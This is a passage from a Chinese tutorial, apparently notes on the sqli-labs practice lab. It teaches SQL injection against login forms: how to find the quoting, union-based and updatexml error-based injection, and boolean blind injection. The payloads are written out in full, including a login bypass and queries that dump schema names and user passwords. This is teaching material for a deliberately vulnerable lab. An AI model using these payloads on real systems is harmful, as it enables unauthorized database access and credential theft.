<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>admin<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;</span>$uname<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<p>通过报错信息看出其中使用了<code>单引号</code>进行闭合，同时也多了一个单引号导致无法进行闭合</p>
<h3 id="2、括号双引号-quot-quot-：less-13"><a href="#2、括号双引号-quot-quot-：less-13" class="headerlink" title="2、括号双引号(&quot;&quot;)：less-13"></a>2、括号双引号<code>(&quot;&quot;)</code>：less-13</h3><p>输入单引号<code>&#39;</code>和单引号括号<code>&#39;)</code>报错</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf927659-929d-4ccd-8616-22d7d4ce51c7/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;</span>$uname<span class="string">&#x27;) and password=(&#x27;</span>$passwd<span class="string">&#x27;) LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、无闭合：less-2"><a href="#3、无闭合：less-2" class="headerlink" title="3、无闭合：less-2"></a>3、无闭合：less-2</h3><p>输入<code>?id=&#39;1</code></p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8c282a03-1269-4c08-b4b5-573b0ccf44d0/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错语句</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 后台查询语句</span></span><br><span class="line"><span class="string">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="4、其他："><a href="#4、其他：" class="headerlink" title="4、其他："></a>4、其他：</h3><p>除以上介绍的几种之外，闭合方式还有很多种。在判断闭合方式的时候，主要根据报错语句及页面的响应来判断</p>
<h2 id="六、联合查询注入"><a href="#六、联合查询注入" class="headerlink" title="六、联合查询注入"></a>六、联合查询注入</h2><p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<p>联合查询注入是一种有回显的注入方法，利用union select 来构造payload进行查询，从而实现SQL注入攻击。</p>
<h3 id="1、判断闭合"><a href="#1、判断闭合" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>传入下面值来进行判断</p>
<blockquote>
<p>uname&#x3D;<code>admin’</code>passwd&#x3D;<code>aaa</code></p>
</blockquote>
<p>或者</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>aaa&#39;</code></p>
</blockquote>
<p>观察页面的报错信息，通过报错信息可以判断出使用的是单引号进行闭合</p>
<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p>传入</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 1--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 2--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 3--+</code></p>
</blockquote>
<p>当传入值为1和2时，页面响应正常。</p>
<p>当传入值为3时，页面报错提示<code>Unknown column &#39;3&#39; in &#39;order clause’</code></p>
<p>表示在当前的查询语句中只有两个字段</p>
<h3 id="3、判断回显位置"><a href="#3、判断回显位置" class="headerlink" title="3、判断回显位置"></a>3、判断回显位置</h3><p>部分从数据库获取的数据并不一定完整的被输出到页面上，因此要找到一个合适的输出位置来显示注入结果</p>
<p>使用union select 进行查询，从而判断回显位置</p>
<blockquote>
<p>username&#x3D;admin&amp;password&#x3D;’union select 1,2 –+</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e2c9d2d3-9b11-421d-af6d-3b3089661326/Untitled.png" alt="Untitled"></p>
<p>由上可见，1，2位置都可以回显到页面</p>
<h3 id="4、获取数据库基础信息"><a href="#4、获取数据库基础信息" class="headerlink" title="4、获取数据库基础信息"></a>4、获取数据库基础信息</h3><p>利用数据库的内置函数进行信息收集</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前的数据库</span><br><span class="line"><span class="keyword">SELECT</span> DATABASE()</span><br><span class="line"></span><br><span class="line"># 查看当前数据库版本</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@VERSION</span> </span><br><span class="line"><span class="keyword">SELECT</span> VERSION()</span><br><span class="line"></span><br><span class="line"># 查看用户</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()                        # 用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>()                # 当前用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">system_user</span>()                 # 系统用户名</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>()                # 链接数据库的用户名</span><br><span class="line"></span><br><span class="line"># 内置函数</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>                     # 读取数据库路径</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@basedir</span>                     # MySQL安装路径</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>_compile_os           # 操作系统</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@secure</span>_file_priv            # 查看数据库secure_file_priv 的参数值</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_sets_dir          # 字符集安装目录</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_set_server        # 字符集编码格式</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@hostname</span>;                   # 查看主机名</span><br></pre></td></tr></table></figure>

<h3 id="5、查询数据库"><a href="#5、查询数据库" class="headerlink" title="5、查询数据库"></a>5、查询数据库</h3><p>使用<code>select database()</code> 可以查询数据库，但是仅能查询当前所在的数据库</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,database() --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/641bfdf8-54bd-438d-9b17-80491b6171c9/Untitled.png" alt="Untitled"></p>
<p>可以使用以下语句查询其他数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<p>由于以上语句查询出的结果为多列，因此需要使用<code>group_concat()</code>将结果进行拼接</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(schema_name) from information_schema.SCHEMATA --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23c40e2a-b6b2-4e21-8118-04e868026058/Untitled.png" alt="Untitled"></p>
<h3 id="6、查询指定数据库内的表"><a href="#6、查询指定数据库内的表" class="headerlink" title="6、查询指定数据库内的表"></a>6、查询指定数据库内的表</h3><p>这里来查询<code>security</code>数据库内的表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d0e922a-bdc5-42ed-a2c8-33c1c49db3ba/Untitled.png" alt="Untitled"></p>
<p>若是要查询其他数据库内的表，则更换table_schema的值即可</p>
<h3 id="7、查询表内的字段"><a href="#7、查询表内的字段" class="headerlink" title="7、查询表内的字段"></a>7、查询表内的字段</h3><p>这里来查询表<code>security.users</code> 内的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7fbc489b-c32b-42ad-ae35-3ca5ed0847ac/Untitled.png" alt="Untitled"></p>
<p>这里需要加上<code>table_schema</code>来限制数据库，否则会将数据库中所有的user表内字段都查询出来</p>
<h3 id="8、查询数据"><a href="#8、查询数据" class="headerlink" title="8、查询数据"></a>8、查询数据</h3><p>此时已经获取到了security.users表结构</p>
<p>可以进行数据的查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(username,0x7e,password) from security.users--+</code></p>
</blockquote>
<p>0x7e是符号 ～ 的16进制</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b23fae72-deb4-49b6-a2a7-21f28e1662a2/Untitled.png" alt="Untitled"></p>
<p>查询到所有表中的数据</p>
<h2 id="七、报错注入"><a href="#七、报错注入" class="headerlink" title="七、报错注入"></a>七、报错注入</h2><p>报错注入是通过使用特殊的函数构造payload，使后台的SQL语句执行时出错，并将报错信息回显在页面上，要查询的信息也会随着报错信息回显</p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<p>之前输入单引号进行报错，从而判断闭合方式的，也是一种报错</p>
<aside>

<p>💡 从这里就可以看出报错注入的限制，必须要求网站能将报错信息详细的回显到页面上</p>
</aside>

<p><strong>Xpath语法错误：</strong><code>extractvalue()</code>、<code>updatexml()</code></p>
<h3 id="1、判断闭合-1"><a href="#1、判断闭合-1" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>传值</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7bfc4e68-7c8b-43b6-81af-81e2c6bf3506/Untitled.png" alt="Untitled"></p>
<p>通过页面报错信息，可以判断当前页面使用了单引号进行闭合</p>
<h3 id="2、判断列数-1"><a href="#2、判断列数-1" class="headerlink" title="2、判断列数"></a><del>2、判断列数</del></h3><aside>

<p>⚠️ <del>由于并不使用页面本身的回显，这里不需要判断列数</del></p>
</aside>

<p><del>分别传值</del></p>
<blockquote>
<p><del>uname&#x3D;~~~~&#96;admin<code>~~~~&amp;passwd=~~~~</code>‘order by 1–+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>‘order by 2–+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>‘order by 3–+&#96;</del></p>
</blockquote>
<p><del>当传入值为1和2时，页面响应正常。</del></p>
<p><del>当传入值为3时，页面报错提示~~~~&#96;Unknown column ‘3’ in ‘order clause’&#96;</del></p>
<p><del>表示在当前的查询语句中只有两个字段</del></p>
<h3 id="3、查询数据库"><a href="#3、查询数据库" class="headerlink" title="3、查询数据库"></a>3、查询数据库</h3><p>报错注入并不使用查询的回显位置进行回显，因此不需要判断查询的回显位置</p>
<p>使用以下语句查询所有数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3)--+</code></p>
</blockquote>
<h3 id="⚠️-查询数据不全"><a href="#⚠️-查询数据不全" class="headerlink" title="⚠️ 查询数据不全"></a>⚠️ 查询数据不全</h3><p>此时可以发现查询出的数据库信息不全</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/00a75786-8d25-4aba-83ba-939f7c68c6a6/Untitled.png" alt="Untitled"></p>
<p>这里是由于<code>extractvalue()</code>和<code>updatexml()</code>最多只能报32个字的错误，其余的都被省略了</p>
<p>要想其余被省略的信息显示出来，可以使用where子句添加条件限制输出结果</p>
<p>例如在此处，若是想要查询其他数据库名，可添加子句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> schema_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;information_schema&#x27;</span>,<span class="string">&#x27;challenges&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata where schema_name not in (&#39;information_schema&#39;,&#39;challenges&#39;))),3)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a4aac31-6833-4573-981c-ac7998c6f3a3/Untitled.png" alt="Untitled"></p>
<p>将已知结果排除在外，便可看到新的结果</p>
<h3 id="4、查询指定数据库内的表"><a href="#4、查询指定数据库内的表" class="headerlink" title="4、查询指定数据库内的表"></a>4、查询指定数据库内的表</h3><p>这里来查询<code>security</code>数据库内的表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),3) --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf776d6f-237a-4ef3-aa65-ceadff18b349/Untitled.png" alt="Untitled"></p>
<p>若是数据显示不全，则使用<code>where</code>子句进行限制</p>
<p>若要查询其他数据库内的表，则更换<code>table_schema</code>的值即可</p>
<h3 id="5、查询表内字段"><a href="#5、查询表内字段" class="headerlink" title="5、查询表内字段"></a>5、查询表内字段</h3><p>这里来查询表<code>security.users</code> 内的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)),3)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d9c6276-8f12-42ee-80c2-5d6a3fc3bd66/Untitled.png" alt="Untitled"></p>
<p>这里需要加上<code>table_schema</code>来限制数据库，否则会将数据库中所有的user表内字段都查询出来</p>
<p>若是数据显示不全，则使用<code>where</code>子句进行限制</p>
<p>若要查询其他数据库内的表，则更换<code>table_schema</code>和<code>table_name</code>的值即可</p>
<h3 id="6、查询数据"><a href="#6、查询数据" class="headerlink" title="6、查询数据"></a>6、查询数据</h3><p>此时已经获取到了security.users表结构</p>
<p>可以进行数据的查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x7e,password) from security.users)),3) --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/10b5475b-8488-4caf-bb37-c1cc55ee3e1c/Untitled.png" alt="Untitled"></p>
<p>若要显示其他的数据，则可通过where子句进行限制</p>
<h2 id="八、布尔盲注"><a href="#八、布尔盲注" class="headerlink" title="八、布尔盲注"></a>八、布尔盲注</h2><p>盲注，则是在页面没有回显或回显不足以获取数据的情况下可以选择使用的注入方法</p>
<p>例如：</p>
<ul>
<li>登陆成功与否都不会回显任何数据库相关的值</li>
<li>没有报错信息回显</li>
<li>报错信息回显过于简单</li>
</ul>
<p>布尔盲注的基本原理是：通过判断页面对所构造的布尔表达式正确或错误的响应，推断出想得到的数据</p>
<aside>

<p>💡 <code>uname=admin</code>&amp;<code>passwd=&#39;or&#39;1&#39;=&#39;1</code></p>
</aside>

<p>在万能密码中就可以看到布尔盲注的影子</p>
<p>通过构造永真表达式，来绕过登陆验证</p>
<p>若将1&#x3D;1替换为1&#x3D;2这样的永假式，便不能成功登陆了</p>
<p>这里就可以看到，当后方表达式为真，则登陆成功;若表达式为假，则登陆失败</p>
<p>这样就可以通过构造类似于<code>database()=&#39;security&#39;</code> 这样的表达式，来进行数据库结构的推测</p>
<h3 id="1、判断闭合-2"><a href="#1、判断闭合-2" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>由于环境条件的限制，断然不可能使用之前的观察报错信息的方法来判断闭合方式</p>
<p>可以采用永真和永假表达式来判断</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-15/">http://10.211.55.6/sqli-labs/Less-15/</a></p>
<blockquote>
<p><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;1</code>  # 页面返回成功<br><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;2</code>  # 页面返回失败</p>
</blockquote>
<p>则表明使用了单引号进行闭合，同时还能得到<code>正确</code>和<code>错误</code>的不同响应页面</p>
<h3 id="2、判断正确和错误响应"><a href="#2、判断正确和错误响应" class="headerlink" title="2、判断正确和错误响应"></a>2、判断正确和错误响应</h3><p>通过传入永真式和永假式得到正确和错误的相应页面</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;1</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/51771881-a5e6-4100-9961-8dce8e95ce76/Untitled.png" alt="Untitled"></p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;2</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c0e0238a-ddb6-4ef5-b2de-b889c150c95c/Untitled.png" alt="Untitled"></p>
<p>可与上一步判断闭合一起进行</p>
<h3 id="3、判断数据库数量"><a href="#3、判断数据库数量" class="headerlink" title="3、判断数据库数量"></a>3、判断数据库数量</h3><p>该步骤可有可无</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=1--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=2--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=3--+</code>  # 错误<br>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=7--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=8--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=9--+</code>  # 正确</p>
</blockquote>
<p>除了等号，其他符号也可以进行判断 <code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> <code>LIKE</code> </p>
<blockquote>
<p>1–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)10–+<code>  # 错误 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)5–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)7–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)9–+&#96;  # 正确</p>
</blockquote>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 8--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 9--+</code>  # 正确</p>
</blockquote>
<h3 id="4、判断数据库"><a href="#4、判断数据库" class="headerlink" title="4、判断数据库"></a>4、判断数据库</h3><p>使用<code>limit</code>关键字来限制输出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>使用字符串处理函数获取某一位的字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>((<span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>类似的函数还有：<code>right()</code> <code>left()</code> <code>MID()</code> <code>reverse()</code> <code>RPAD()</code> 等</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),2)=&#39;se&#39;--+ </code>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),8)=&#39;security&#39;--+</code></p>
</blockquote>
<h3 id="5、判断表名"><a href="#5、判断表名" class="headerlink" title="5、判断表名"></a>5、判断表名</h3><p>查询数据库security中的表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p>判断表名</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;--+ </code>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),1)=&#39;u&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),5)=&#39;users&#39;--+</code></p>
</blockquote>
<p>不断推测出其他的表名</p>
<h3 id="6、判断列名"><a href="#6、判断列名" class="headerlink" title="6、判断列名"></a>6、判断列名</h3><p>查询security.users表中的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;--+ </code>…….<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 1,1),8)=&#39;username&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 2,1),8)=&#39;password&#39;--+</code></p>
</blockquote>
<h3 id="7、猜测数据"><a href="#7、猜测数据" class="headerlink" title="7、猜测数据"></a>7、猜测数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<blockquote>
